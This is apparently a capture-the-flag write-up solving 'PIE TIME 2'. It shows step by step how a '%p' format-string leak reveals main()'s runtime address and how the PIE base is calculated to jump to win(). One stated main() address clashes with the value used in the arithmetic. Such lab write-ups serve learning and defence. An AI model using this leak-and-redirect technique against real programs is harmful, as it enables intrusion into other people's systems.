![PIE-TIME-2-challenge](https://github.com/user-attachments/assets/2b7c05b3-c48c-4599-bbf0-510072d755c8)

# Step 1
Use GDB to find the local addresses of functions.

```
(webshell)

gdb ./vuln
(gdb) info functions
```

local address of win(): 0x000000000000136a  
local address of main(): 0x0000000000001400  

# Step 2
Run the challenge. When prompted to enter our name, we can use a format string attack to leak stack addresses.

```
(webshell - running ./vuln)

Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x60493c2af2a1 (nil) 0x60493c2af2d0 0x7ffc005d9110 0x7c 0x7ffc005e9228 0x7fbe139a46a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070252070 0x604920fb2400 0x7ffc005d9170 0x604920fb21c0
enter the address to jump to, ex => 0x12345:
```

# Step 3
We will try inputting each of the leaked addresses to jump to them. Then, we will observe the behavior of the program. (uninteresting attempts have been omitted)

```
(webshell - running ./vuln)

Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x60493c2af2a1 (nil) 0x60493c2af2d0 0x7ffc005d9110 0x7c 0x7ffc005e9228 0x7fbe139a46a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070252070 0x604920fb2400 0x7ffc005d9170 0x604920fb21c0
enter the address to jump to, ex => 0x12345: 0x604920fb2400
Enter your name:
```

Since entering 0x604920fb2400 caused us to jump back to "Enter your name:", this must be the address of main().

# Step 4
Using the leaked address of main() and the known local addresses, we can calculate the address of win().

address of main(): 0x587f8671f33d    
baseline address = address of main() - local address of main() = 0x604920fb1000  
address of win() = baseline address + local address of win() = 0x604920fb236a  

# Step 5
Input the address of win().

```
(webshell - running ./vuln)

Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x60493c2af2a1 (nil) 0x60493c2af2d0 0x7ffc005d9110 0x7c 0x7ffc005e9228 0x7fbe139a46a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070252070 0x604920fb2400 0x7ffc005d9170 0x604920fb21c0
enter the address to jump to, ex => 0x12345: 0x604920fb2400
Enter your name:
enter the address to jump to, ex => 0x12345: 0x604920fb236a
```
